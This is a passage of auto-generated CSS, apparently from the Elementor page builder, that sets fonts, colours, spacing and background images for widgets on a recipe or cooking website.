--e-global-typography-secondary-font-weight );color:var( --e-global-color-secondary );}.elementor-widget-hfe-site-tagline .hfe-icon i{color:var( --e-global-color-primary );}.elementor-widget-hfe-site-tagline .hfe-icon svg{fill:var( --e-global-color-primary );}.elementor-widget-site-logo .hfe-site-logo-container .hfe-site-logo-img{border-color:var( --e-global-color-primary );}.elementor-widget-site-logo .widget-image-caption{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-hfe-search-button input[type="search"].hfe-search-form__input,.elementor-widget-hfe-search-button .hfe-search-icon-toggle{font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-hfe-search-button .hfe-search-form__input{color:var( --e-global-color-text );}.elementor-widget-hfe-search-button .hfe-search-form__input::placeholder{color:var( --e-global-color-text );}.elementor-widget-hfe-search-button .hfe-search-form__container, .elementor-widget-hfe-search-button .hfe-search-icon-toggle .hfe-search-form__input,.elementor-widget-hfe-search-button .hfe-input-focus .hfe-search-icon-toggle .hfe-search-form__input{border-color:var( --e-global-color-primary );}.elementor-widget-hfe-search-button .hfe-search-form__input:focus::placeholder{color:var( --e-global-color-text );}.elementor-widget-hfe-search-button .hfe-search-form__container button#clear-with-button,
					.elementor-widget-hfe-search-button .hfe-search-form__container button#clear,
					.elementor-widget-hfe-search-button .hfe-search-icon-toggle button#clear{color:var( --e-global-color-text );}.elementor-widget-hfe-cart .hfe-menu-cart__toggle .elementor-button{font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-text-path{font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}
.elementor-8 .elementor-element.elementor-element-03a9e2b > .elementor-container{max-width:1300px;min-height:90vh;}.elementor-8 .elementor-element.elementor-element-03a9e2b:not(.elementor-motion-effects-element-type-background), .elementor-8 .elementor-element.elementor-element-03a9e2b > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-color:#000000;background-image:url("../aztechost.com/images/recipe/uploads/2022/cookingbg.png");background-position:bottom center;background-repeat:no-repeat;background-size:cover;}.elementor-8 .elementor-element.elementor-element-03a9e2b > .elementor-background-overlay{background-color:transparent;background-image:linear-gradient(132deg, #000000E6 29%, #0000003B 63%);opacity:1;transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-8 .elementor-element.elementor-element-03a9e2b{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;margin-top:0px;margin-bottom:0px;}.elementor-bc-flex-widget .elementor-8 .elementor-element.elementor-element-a3183bb.elementor-column .elementor-widget-wrap{align-items:flex-start;}.elementor-8 .elementor-element.elementor-element-a3183bb.elementor-column.elementor-element[data-element_type="column"] > .elementor-widget-wrap.elementor-element-populated{align-content:flex-start;align-items:flex-start;}.elementor-8 .elementor-element.elementor-element-a3183bb > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-a3183bb > .elementor-element-populated{padding:5px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-0ba973b{--spacer-size:10px;}.elementor-8 .elementor-element.elementor-element-b1f4ca8{--spacer-size:10px;}.elementor-8 .elementor-element.elementor-element-38b7e6d{text-align:left;}.elementor-8 .elementor-element.elementor-element-38b7e6d img{opacity:1;}.elementor-8 .elementor-element.elementor-element-38b7e6d > .elementor-widget-container{padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-894939f{--spacer-size:26px;}.elementor-8 .elementor-element.elementor-element-ebd1438 .elementor-icon-list-items:not(.elementor-inline-items) .elementor-icon-list-item:not(:last-child){padding-bottom:calc(15px/2);}.elementor-8 .elementor-element.elementor-element-ebd1438 .elementor-icon-list-items:not(.elementor-inline-items) .elementor-icon-list-item:not(:first-child){margin-top:calc(15px/2);}.elementor-8 .elementor-element.elementor-element-ebd1438 .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item{margin-right:calc(15px/2);margin-left:calc(15px/2);}.elementor-8 .elementor-element.elementor-element-ebd1438 .elementor-icon-list-items.elementor-inline-items{margin-right:calc(-15px/2);margin-left:calc(-15px/2);}body.rtl .elementor-8 .elementor-element.elementor-element-ebd1438 .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item:after{left:calc(-15px/2);}body:not(.rtl) .elementor-8 .elementor-element.elementor-element-ebd1438 .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item:after{right:calc(-15px/2);}.elementor-8 .elementor-element.elementor-element-ebd1438 .elementor-icon-list-icon i{color:#D61362;transition:color 0.3s;}.elementor-8 .elementor-element.elementor-element-ebd1438 .elementor-icon-list-icon svg{fill:#D61362;transition:fill 0.3s;}.elementor-8 .elementor-element.elementor-element-ebd1438{--e-icon-list-icon-size:14px;--icon-vertical-offset:0px;}.elementor-8 .elementor-element.elementor-element-ebd1438 .elementor-icon-list-item > .elementor-icon-list-text, .elementor-8 .elementor-element.elementor-element-ebd1438 .elementor-icon-list-item > a{font-family:"Roboto", Sans-serif;font-size:25px;font-weight:400;}.elementor-8 .elementor-element.elementor-element-ebd1438 .elementor-icon-list-text{color:#FFFFFF;transition:color 0.3s;}.elementor-8 .elementor-element.elementor-element-c31e9f1{--spacer-size:10px;}.elementor-8 .elementor-element.elementor-element-41eca6d .elementor-button{font-size:14px;font-weight:600;text-transform:uppercase;letter-spacing:1px;fill:#ffffff;color:#ffffff;background-color:#F83131;border-radius:3px 3px 3px 3px;padding:20px 049px 20px 049px;}.elementor-8 .elementor-element.elementor-element-41eca6d .elementor-button:hover, .elementor-8 .elementor-element.elementor-element-41eca6d .elementor-button:focus{color:#ff5607;background-color:#ffffff;}.elementor-8 .elementor-element.elementor-element-41eca6d .elementor-button:hover svg, .elementor-8 .elementor-element.elementor-element-41eca6d .elementor-button:focus svg{fill:#ff5607;}.elementor-8 .elementor-element.elementor-element-41eca6d > .elementor-widget-container{padding:28px 0px 0px 32px;}.elementor-8 .elementor-element.elementor-element-71a2407{--spacer-size:27px;}.elementor-8 .elementor-element.elementor-element-fea3a06 > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-fea3a06 > .elementor-element-populated{margin:0px 0px 0px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:27px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-e56694c > .elementor-container{min-height:368px;}.elementor-8 .elementor-element.elementor-element-996ae7d{--spacer-size:50px;}.elementor-8 .elementor-element.elementor-element-35b76bf{color:#54595F;font-family:"Roboto", Sans-serif;font-size:25px;font-weight:400;}.elementor-8 .elementor-element.elementor-element-35b76bf > .elementor-widget-container{padding:0px 100px 0px 100px;}.elementor-8 .elementor-element.elementor-element-e1cd9e8{--spacer-size:50px;}.elementor-8 .elementor-element.elementor-element-0a10249 > .elementor-container{min-height:503px;}.elementor-8 .elementor-element.elementor-element-0a10249{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;}.elementor-8 .elementor-element.elementor-element-0a10249 > .elementor-background-overlay{transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-8 .elementor-element.elementor-element-fdf413c{text-align:center;}.elementor-8 .elementor-element.elementor-element-fdf413c .elementor-heading-title{color:#F8C734;}.elementor-8 .elementor-element.elementor-element-5c7b016{--spacer-size:50px;}.elementor-8 .elementor-element.elementor-element-d53ea47 > .elementor-container{max-width:1300px;}.elementor-8 .elementor-element.elementor-element-d53ea47:not(.elementor-motion-effects-element-type-background), .elementor-8 .elementor-element.elementor-element-d53ea47 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("../aztechost.com/images/recipe/uploads/2021/03/pexels-elle-hughes-1660030-scaled.jpg");background-position:center center;background-repeat:no-repeat;background-size:cover;}.elementor-8 .elementor-element.elementor-element-d53ea47{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;padding:104px 0px 86px 0px;}.elementor-8 .elementor-element.elementor-element-d53ea47 > .elementor-background-overlay{transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-8 .elementor-element.elementor-element-0336310 > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-0336310 > .elementor-element-populated{padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-4f936a3 .elementor-heading-title{color:#FF3131;font-family:"Poppins", Sans-serif;font-size:40px;font-weight:600;line-height:1.35em;}.elementor-8 .elementor-element.elementor-element-4f936a3 > .elementor-widget-container{margin:0px 0px 23px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-bce4370{color:#888888;font-family:"Poppins", Sans-serif;font-size:24px;font-weight:300;line-height:1.54em;}.elementor-8 .elementor-element.elementor-element-bce4370 > .elementor-widget-container{margin:0px 0px 64px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-31d0ace.elementor-view-stacked .elementor-icon{background-color:#49AB1F;}.elementor-8 .elementor-element.elementor-element-31d0ace.elementor-view-framed .elementor-icon, .elementor-8 .elementor-element.elementor-element-31d0ace.elementor-view-default .elementor-icon{fill:#49AB1F;color:#49AB1F;border-color:#49AB1F;}.elementor-8 .elementor-element.elementor-element-31d0ace{--icon-box-icon-margin:36px;}.elementor-8 .elementor-element.elementor-element-31d0ace .elementor-icon{font-size:40px;}.elementor-8 .elementor-element.elementor-element-31d0ace .elementor-icon-box-title{margin-bottom:10px;color:#121212;}.elementor-8 .elementor-element.elementor-element-31d0ace .elementor-icon-box-title, .elementor-8 .elementor-element.elementor-element-31d0ace .elementor-icon-box-title a{font-family:"Poppins", Sans-serif;font-size:24px;font-weight:300;line-height:1.54em;}.elementor-8 .elementor-element.elementor-element-31d0ace .elementor-icon-box-description{color:#888888;font-family:"Poppins", Sans-serif;font-size:18px;font-weight:300;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-31d0ace > .elementor-widget-container{margin:0px 0px 23px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-1383f0b.elementor-view-stacked .elementor-icon{background-color:#49AB1F;}.elementor-8 .elementor-element.elementor-element-1383f0b.elementor-view-framed .elementor-icon, .elementor-8 .elementor-element.elementor-element-1383f0b.elementor-view-default .elementor-icon{fill:#49AB1F;color:#49AB1F;border-color:#49AB1F;}.elementor-8 .elementor-element.elementor-element-1383f0b{--icon-box-icon-margin:36px;}.elementor-8 .elementor-element.elementor-element-1383f0b .elementor-icon{font-size:40px;}.elementor-8 .elementor-element.elementor-element-1383f0b .elementor-icon-box-title{margin-bottom:10px;color:#121212;}.elementor-8 .elementor-element.elementor-element-1383f0b .elementor-icon-box-title, .elementor-8 .elementor-element.elementor-element-1383f0b .elementor-icon-box-title a{font-family:"Poppins", Sans-serif;font-size:24px;font-weight:300;line-height:1.54em;}.elementor-8 .elementor-element.elementor-element-1383f0b .elementor-icon-box-description{color:#888888;font-family:"Poppins", Sans-serif;font-size:18px;font-weight:300;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-1383f0b > .elementor-widget-container{margin:0px 0px 23px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-bfad71e.elementor-view-stacked .elementor-icon{background-color:#49AB1F;}.elementor-8 .elementor-element.elementor-element-bfad71e.elementor-view-framed .elementor-icon, .elementor-8 .elementor-element.elementor-element-bfad71e.elementor-view-default .elementor-icon{fill:#49AB1F;color:#49AB1F;border-color:#49AB1F;}.elementor-8 .elementor-element.elementor-element-bfad71e{--icon-box-icon-margin:36px;}.elementor-8 .elementor-element.elementor-element-bfad71e .elementor-icon{font-size:40px;}.elementor-8 .elementor-element.elementor-element-bfad71e .elementor-icon-box-title{margin-bottom:10px;color:#121212;}.elementor-8 .elementor-element.elementor-element-bfad71e .elementor-icon-box-title, .elementor-8 .elementor-element.elementor-element-bfad71e .elementor-icon-box-title a{font-family:"Poppins", Sans-serif;font-size:24px;font-weight:300;line-height:1.54em;}.elementor-8 .elementor-element.elementor-element-bfad71e .elementor-icon-box-description{color:#888888;font-family:"Poppins", Sans-serif;font-size:18px;font-weight:300;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-bfad71e > .elementor-widget-container{margin:0px 0px 23px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-ecf777e > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-ec9f6f2{--spacer-size:50px;}.elementor-8 .elementor-element.elementor-element-8d8ccd0{color:#54595F;font-family:"Roboto", Sans-serif;font-size:27px;font-weight:400;}.elementor-8 .elementor-element.elementor-element-8d8ccd0 > .elementor-widget-container{padding:20px 0px 20px 0px;}.elementor-8 .elementor-element.elementor-element-eeb449c{--spacer-size:50px;}.elementor-8 .elementor-element.elementor-element-7e00189{text-align:center;}.elementor-8 .elementor-element.elementor-element-7e00189 .elementor-heading-title{color:#F8C734;}.elementor-8 .elementor-element.elementor-element-505a742 > .elementor-widget-container{padding:0px 25px 0px 0px;}.elementor-8 .elementor-element.elementor-element-639e5d8{--spacer-size:50px;}.elementor-8 .elementor-element.elementor-element-3eafbe9 .elementor-icon-list-items:not(.elementor-inline-items) .elementor-icon-list-item:not(:last-child){padding-bottom:calc(16px/2);}.elementor-8 .elementor-element.elementor-element-3eafbe9 .elementor-icon-list-items:not(.elementor-inline-items) .elementor-icon-list-item:not(:first-child){margin-top:calc(16px/2);}.elementor-8 .elementor-element.elementor-element-3eafbe9 .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item{margin-right:calc(16px/2);margin-left:calc(16px/2);}.elementor-8 .elementor-element.elementor-element-3eafbe9 .elementor-icon-list-items.elementor-inline-items{margin-right:calc(-16px/2);margin-left:calc(-16px/2);}body.rtl .elementor-8 .elementor-element.elementor-element-3eafbe9 .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item:after{left:calc(-16px/2);}body:not(.rtl) .elementor-8 .elementor-element.elementor-element-3eafbe9 .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item:after{right:calc(-16px/2);}.elementor-8 .elementor-element.elementor-element-3eafbe9 .elementor-icon-list-icon i{color:#49AB1F;transition:color 0.3s;}.elementor-8 .elementor-element.elementor-element-3eafbe9 .elementor-icon-list-icon svg{fill:#49AB1F;transition:fill 0.3s;}.elementor-8 .elementor-element.elementor-element-3eafbe9{--e-icon-list-icon-size:28px;--icon-vertical-offset:0px;}.elementor-8 .elementor-element.elementor-element-3eafbe9 .elementor-icon-list-item > .elementor-icon-list-text, .elementor-8 .elementor-element.elementor-element-3eafbe9 .elementor-icon-list-item > a{font-family:"Roboto", Sans-serif;font-size:32px;font-weight:400;}.elementor-8 .elementor-element.elementor-element-3eafbe9 .elementor-icon-list-text{color:#54595F;transition:color 0.3s;}.elementor-8 .elementor-element.elementor-element-a8b8db7 > .elementor-container{max-width:1300px;}.elementor-8 .elementor-element.elementor-element-a8b8db7:not(.elementor-motion-effects-element-type-background), .elementor-8 .elementor-element.elementor-element-a8b8db7 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("../aztechost.com/images/recipe/uploads/2019/05/bg_2.jpg");background-position:center center;background-repeat:no-repeat;background-size:cover;}.elementor-8 .elementor-element.elementor-element-a8b8db7{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;padding:103px 0px 69px 0px;}.elementor-8 .elementor-element.elementor-element-a8b8db7 > .elementor-background-overlay{transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-8 .elementor-element.elementor-element-ff8a548.elementor-column > .elementor-widget-wrap{justify-content:center;}.elementor-8 .elementor-element.elementor-element-ff8a548 > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-ff8a548 > .elementor-element-populated{padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-210b64b{text-align:center;}.elementor-8 .elementor-element.elementor-element-210b64b .elementor-heading-title{color:#ffffff;font-family:"Poppins", Sans-serif;font-size:40px;font-weight:600;line-height:1.35em;}.elementor-8 .elementor-element.elementor-element-210b64b > .elementor-widget-container{margin:0px 0px 25px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-8445e2e{text-align:center;color:#ffffff;font-family:"Poppins", Sans-serif;font-size:18px;font-weight:300;line-height:1.89em;width:var( --container-widget-width, 612px );max-width:612px;--container-widget-width:612px;--container-widget-flex-grow:0;}.elementor-8 .elementor-element.elementor-element-8445e2e > .elementor-widget-container{margin:0px 0px 40px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-03b6776 a{color:#ffffff;}.elementor-8 .elementor-element.elementor-element-03b6776 a:hover{color:#ff5607;}.elementor-8 .elementor-element.elementor-element-03b6776{margin-top:0px;margin-bottom:0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-cd10cac.elementor-column > .elementor-widget-wrap{justify-content:center;}.elementor-8 .elementor-element.elementor-element-cd10cac > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-cd10cac > .elementor-element-populated{margin:0px 0px 50px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 25px 0px 25px;}.elementor-8 .elementor-element.elementor-element-a0791b4.elementor-position-right .elementor-image-box-img{margin-left:0px;}.elementor-8 .elementor-element.elementor-element-a0791b4.elementor-position-left .elementor-image-box-img{margin-right:0px;}.elementor-8 .elementor-element.elementor-element-a0791b4.elementor-position-top .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-a0791b4 .elementor-image-box-wrapper .elementor-image-box-img{width:100%;}.elementor-8 .elementor-element.elementor-element-a0791b4 .elementor-image-box-img img{transition-duration:0.3s;}.elementor-8 .elementor-element.elementor-element-a0791b4 .elementor-image-box-title{color:#ffffff;font-family:"Poppins", Sans-serif;font-size:20px;font-weight:700;}.elementor-8 .elementor-element.elementor-element-a0791b4 > .elementor-widget-container{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-332daee.elementor-column > .elementor-widget-wrap{justify-content:center;}.elementor-8 .elementor-element.elementor-element-332daee > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-332daee > .elementor-element-populated{margin:0px 0px 50px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 25px 0px 25px;}.elementor-8 .elementor-element.elementor-element-b851ea2.elementor-position-right .elementor-image-box-img{margin-left:0px;}.elementor-8 .elementor-element.elementor-element-b851ea2.elementor-position-left .elementor-image-box-img{margin-right:0px;}.elementor-8 .elementor-element.elementor-element-b851ea2.elementor-position-top .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-b851ea2 .elementor-image-box-wrapper .elementor-image-box-img{width:100%;}.elementor-8 .elementor-element.elementor-element-b851ea2 .elementor-image-box-img img{transition-duration:0.3s;}.elementor-8 .elementor-element.elementor-element-b851ea2 .elementor-image-box-title{color:#ffffff;font-family:"Poppins", Sans-serif;font-size:20px;font-weight:700;}.elementor-8 .elementor-element.elementor-element-b851ea2 > .elementor-widget-container{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-cb5a92b.elementor-column > .elementor-widget-wrap{justify-content:center;}.elementor-8 .elementor-element.elementor-element-cb5a92b > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-cb5a92b > .elementor-element-populated{margin:0px 0px 50px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 25px 0px 25px;}.elementor-8 .elementor-element.elementor-element-df8b5c5.elementor-position-right .elementor-image-box-img{margin-left:0px;}.elementor-8 .elementor-element.elementor-element-df8b5c5.elementor-position-left .elementor-image-box-img{margin-right:0px;}.elementor-8 .elementor-element.elementor-element-df8b5c5.elementor-position-top .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-df8b5c5 .elementor-image-box-wrapper .elementor-image-box-img{width:100%;}.elementor-8 .elementor-element.elementor-element-df8b5c5 .elementor-image-box-img img{transition-duration:0.3s;}.elementor-8 .elementor-element.elementor-element-df8b5c5 .elementor-image-box-title{color:#ffffff;font-family:"Poppins", Sans-serif;font-size:20px;font-weight:700;}.elementor-8 .elementor-element.elementor-element-df8b5c5 > .elementor-widget-container{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-d2f5d6d.elementor-column > .elementor-widget-wrap{justify-content:center;}.elementor-8 .elementor-element.elementor-element-d2f5d6d > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-d2f5d6d > .elementor-element-populated{margin:0px 0px 50px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 25px 0px 25px;}.elementor-8 .elementor-element.elementor-element-af0a3fe.elementor-position-right .elementor-image-box-img{margin-left:0px;}.elementor-8 .elementor-element.elementor-element-af0a3fe.elementor-position-left .elementor-image-box-img{margin-right:0px;}.elementor-8 .elementor-element.elementor-element-af0a3fe.elementor-position-top .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-af0a3fe .elementor-image-box-wrapper .elementor-image-box-img{width:100%;}.elementor-8 .elementor-element.elementor-element-af0a3fe .elementor-image-box-img img{transition-duration:0.3s;}.elementor-8 .elementor-element.elementor-element-af0a3fe .elementor-image-box-title{color:#ffffff;font-family:"Poppins", Sans-serif;font-size:20px;font-weight:700;}.elementor-8 .elementor-element.elementor-element-af0a3fe > .elementor-widget-container{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-3aad4b6 a{color:#ffffff;}.elementor-8 .elementor-element.elementor-element-3aad4b6 a:hover{color:#ff5607;}.elementor-8 .elementor-element.elementor-element-3aad4b6{margin-top:0px;margin-bottom:0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-9fdaf70.elementor-column > .elementor-widget-wrap{justify-content:center;}.elementor-8 .elementor-element.elementor-element-9fdaf70 > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-9fdaf70 > .elementor-element-populated{margin:0px 0px 50px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 25px 0px 25px;}.elementor-8 .elementor-element.elementor-element-fc9ad4b.elementor-position-right .elementor-image-box-img{margin-left:0px;}.elementor-8 .elementor-element.elementor-element-fc9ad4b.elementor-position-left .elementor-image-box-img{margin-right:0px;}.elementor-8 .elementor-element.elementor-element-fc9ad4b.elementor-position-top .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-fc9ad4b .elementor-image-box-wrapper .elementor-image-box-img{width:100%;}.elementor-8 .elementor-element.elementor-element-fc9ad4b .elementor-image-box-img img{transition-duration:0.3s;}.elementor-8 .elementor-element.elementor-element-fc9ad4b .elementor-image-box-title{color:#ffffff;font-family:"Poppins", Sans-serif;font-size:20px;font-weight:700;}.elementor-8 .elementor-element.elementor-element-fc9ad4b > .elementor-widget-container{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-3917d2b.elementor-column > .elementor-widget-wrap{justify-content:center;}.elementor-8 .elementor-element.elementor-element-3917d2b > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-3917d2b > .elementor-element-populated{margin:0px 0px 50px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 25px 0px 25px;}.elementor-8 .elementor-element.elementor-element-161557a.elementor-position-right .elementor-image-box-img{margin-left:0px;}.elementor-8 .elementor-element.elementor-element-161557a.elementor-position-left .elementor-image-box-img{margin-right:0px;}.elementor-8 .elementor-element.elementor-element-161557a.elementor-position-top .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-161557a .elementor-image-box-wrapper .elementor-image-box-img{width:100%;}.elementor-8 .elementor-element.elementor-element-161557a .elementor-image-box-img img{transition-duration:0.3s;}.elementor-8 .elementor-element.elementor-element-161557a .elementor-image-box-title{color:#ffffff;font-family:"Poppins", Sans-serif;font-size:20px;font-weight:700;}.elementor-8 .elementor-element.elementor-element-161557a > .elementor-widget-container{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-088f2e4.elementor-column > .elementor-widget-wrap{justify-content:center;}.elementor-8 .elementor-element.elementor-element-088f2e4 > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-088f2e4 > .elementor-element-populated{margin:0px 0px 50px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 25px 0px 25px;}.elementor-8 .elementor-element.elementor-element-97ffb51.elementor-position-right .elementor-image-box-img{margin-left:0px;}.elementor-8 .elementor-element.elementor-element-97ffb51.elementor-position-left .elementor-image-box-img{margin-right:0px;}.elementor-8 .elementor-element.elementor-element-97ffb51.elementor-position-top .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-97ffb51 .elementor-image-box-wrapper .elementor-image-box-img{width:100%;}.elementor-8 .elementor-element.elementor-element-97ffb51 .elementor-image-box-img img{transition-duration:0.3s;}.elementor-8 .elementor-element.elementor-element-97ffb51 .elementor-image-box-title{color:#ffffff;font-family:"Poppins", Sans-serif;font-size:20px;font-weight:700;}.elementor-8 .elementor-element.elementor-element-97ffb51 > .elementor-widget-container{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-1008ed1.elementor-column > .elementor-widget-wrap{justify-content:center;}.elementor-8 .elementor-element.elementor-element-1008ed1 > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-1008ed1 > .elementor-element-populated{margin:0px 0px 50px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 25px 0px 25px;}.elementor-8 .elementor-element.elementor-element-ece240d.elementor-position-right .elementor-image-box-img{margin-left:0px;}.elementor-8 .elementor-element.elementor-element-ece240d.elementor-position-left .elementor-image-box-img{margin-right:0px;}.elementor-8 .elementor-element.elementor-element-ece240d.elementor-position-top .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-ece240d .elementor-image-box-wrapper .elementor-image-box-img{width:100%;}.elementor-8 .elementor-element.elementor-element-ece240d .elementor-image-box-img img{transition-duration:0.3s;}.elementor-8 .elementor-element.elementor-element-ece240d .elementor-image-box-title{color:#ffffff;font-family:"Poppins", Sans-serif;font-size:20px;font-weight:700;}.elementor-8 .elementor-element.elementor-element-ece240d > .elementor-widget-container{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-054fee2 .elementor-button{font-size:14px;font-weight:600;text-transform:uppercase;letter-spacing:1px;fill:#ffffff;color:#ffffff;background-color:#F83131;border-radius:3px 3px 3px 3px;padding:20px 049px 20px 049px;}.elementor-8 .elementor-element.elementor-element-054fee2 .elementor-button:hover, .elementor-8 .elementor-element.elementor-element-054fee2 .elementor-button:focus{color:#121212;background-color:#ffffff;}.elementor-8 .elementor-element.elementor-element-054fee2 .elementor-button:hover svg, .elementor-8 .elementor-element.elementor-element-054fee2 .elementor-button:focus svg{fill:#121212;}.elementor-8 .elementor-element.elementor-element-deb19cb > .elementor-container{max-width:1300px;}.elementor-8 .elementor-element.elementor-element-deb19cb{margin-top:0px;margin-bottom:0px;padding:103px 0px 83px 0px;}.elementor-8 .elementor-element.elementor-element-d7431dc > .elementor-element-populated{margin:0px 0px 0px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-8509993{text-align:center;}.elementor-8 .elementor-element.elementor-element-8509993 .elementor-heading-title{color:#F83131;font-family:"Poppins", Sans-serif;font-size:40px;font-weight:600;line-height:1.35em;}.elementor-8 .elementor-element.elementor-element-8509993 > .elementor-widget-container{margin:0px 0px 25px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-3312dcf{margin-top:0px;margin-bottom:0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-d47bb82 > .elementor-widget-wrap > 